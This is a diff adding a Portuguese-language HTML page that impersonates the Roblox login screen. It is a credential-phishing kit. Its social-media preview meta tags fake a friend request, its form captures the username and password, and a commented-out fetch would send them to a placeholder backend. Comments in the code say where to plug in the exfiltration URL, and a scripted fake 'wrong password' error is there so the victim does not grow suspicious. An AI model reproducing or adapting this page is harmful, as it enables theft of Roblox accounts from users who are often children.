@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Roblox</title>
+
+<!-- preview enganoso pra Discord/WhatsApp/Telegram -->
+<meta property="og:title" content="Pedido de amizade - Roblox">
+<meta property="og:description" content="Você recebeu um pedido de amizade. Clique para aceitar.">
+<meta property="og:image" content="https://tr.rbxcdn.com/180DAY-8b1a2e6f3c9d4a5b6c7d8e9f0a1b2c3d/150/150/AvatarHeadshot/Png/noFilter">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://teu-site-aqui.com">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pedido de amizade - Roblox">
+<meta name="twitter:description" content="Você recebeu um pedido de amizade. Clique para aceitar.">
+
+<link rel="icon" href="https://www.roblox.com/favicon.ico">
+
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;
+    background:#232527;
+    color:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+  }
+  .wrap{
+    width:100%;
+    max-width:420px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+  .logo{
+    width:150px;
+    height:auto;
+    margin-bottom:32px;
+    display:block;
+  }
+  .card{
+    width:100%;
+    background:#2b2d2f;
+    border-radius:12px;
+    padding:36px 32px 28px;
+    box-shadow:0 8px 40px rgba(0,0,0,.55);
+  }
+  .card h1{
+    font-size:22px;
+    font-weight:600;
+    text-align:center;
+    margin-bottom:26px;
+    letter-spacing:.2px;
+  }
+  .field{margin-bottom:16px}
+  .field label{
+    display:block;
+    font-size:13px;
+    color:#b0b3b6;
+    margin-bottom:7px;
+    font-weight:500;
+  }
+  .field input{
+    width:100%;
+    padding:13px 14px;
+    background:#1f2123;
+    border:1px solid #3a3d40;
+    border-radius:6px;
+    color:#fff;
+    font-size:15px;
+    outline:none;
+    transition:border-color .15s;
+  }
+  .field input:focus{border-color:#00a2ff}
+  .field input::placeholder{color:#6b6e71}
+  .btn{
+    width:100%;
+    padding:14px;
+    background:#00a2ff;
+    border:0;
+    border-radius:6px;
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+    transition:background .15s;
+    margin-top:6px;
+  }
+  .btn:hover{background:#0090e0}
+  .btn:disabled{opacity:.65;cursor:wait}
+  .err{
+    display:none;
+    color:#ff5c5c;
+    font-size:13px;
+    text-align:center;
+    margin-top:12px;
+  }
+  .links{
+    text-align:center;
+    margin-top:22px;
+    font-size:13px;
+    color:#8a8d90;
+    line-height:1.7;
+  }
+  .links a{color:#00a2ff;text-decoration:none}
+  .links a:hover{text-decoration:underline}
+  .divider{
+    height:1px;
+    background:#3a3d40;
+    margin:20px 0;
+  }
+  .footer{
+    margin-top:26px;
+    font-size:12px;
+    color:#6b6e71;
+    text-align:center;
+  }
+  @media(max-width:480px){
+    .card{padding:28px 22px 22px}
+    .card h1{font-size:20px}
+    .logo{width:120px}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <img class="logo"
+       src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"
+       alt="Roblox"
+       onerror="this.style.display='none'">
+
+  <div class="card">
+    <h1>Entrar</h1>
+
+    <form id="form" novalidate>
+      <div class="field">
+        <label for="username">Nome de usuário / E-mail / Telefone</label>
+        <input id="username" type="text" autocomplete="username"
+               placeholder="Digite seu nome de usuário" required>
+      </div>
+
+      <div class="field">
+        <label for="password">Senha</label>
+        <input id="password" type="password" autocomplete="current-password"
+               placeholder="Digite sua senha" required>
+      </div>
+
+      <button class="btn" id="submitBtn" type="submit">Entrar</button>
+      <div class="err" id="err">Nome de usuário ou senha incorretos. Tente novamente.</div>
+    </form>
+
+    <div class="links">
+      <a href="https://www.roblox.com/account/signupredir" target="_blank" rel="noopener">Esqueceu a senha?</a>
+      <div class="divider"></div>
+      Não tem uma conta? <a href="https://www.roblox.com" target="_blank" rel="noopener">Cadastre-se</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2024 Roblox Corporation. Todos os direitos reservados.
+  </div>
+
+</div>
+
+<script>
+  // ---- AQUI VOCÊ PLUGA O DESTINO DOS DADOS ----
+  // Por enquanto, só loga no console e finge erro.
+  // Troque a linha do fetch por: window.location.href = 'https://teu-backend.com/api/login'
+  // ou descomente o bloco comentado abaixo.
+
+  const form = document.getElementById('form');
+  const btn  = document.getElementById('submitBtn');
+  const err  = document.getElementById('err');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
+
+    if (!username || !password) {
+      err.textContent = 'Preencha todos os campos.';
+      err.style.display = 'block';
+      return;
+    }
+
+    err.style.display = 'none';
+    btn.disabled = true;
+    btn.textContent = 'Entrando...';
+
+    try {
+      // >>> SUBSTITUA PELA TUA URL DE BACKEND QUANDO ESTIVER PRONTA <<<
+      // const r = await fetch('https://teu-backend.com/api/login', {
+      //   method: 'POST',
+      //   headers: { 'Content-Type': 'application/json' },
+      //   body: JSON.stringify({ username, password })
+      // });
+      // const data = await r.json();
+      // if (data.redirect) { window.location.href = data.redirect; return; }
+
+      // ---- MODO TESTE (sem backend) ----
+      console.log('CAPTURA:', { username, password });
+      await new Promise(r => setTimeout(r, 900));
+
+      // simula erro pra vítima não desconfiar que "logou"
+      btn.disabled = false;
+      btn.textContent = 'Entrar';
+      err.textContent = 'Nome de usuário ou senha incorretos. Tente novamente.';
+      err.style.display = 'block';
+
+    } catch (e) {
+      btn.disabled = false;
+      btn.textContent = 'Entrar';
+      err.textContent = 'Erro de conexão. Tente novamente.';
+      err.style.display = 'block';
+    }
+  });
+</script>
+</body>
+</html>
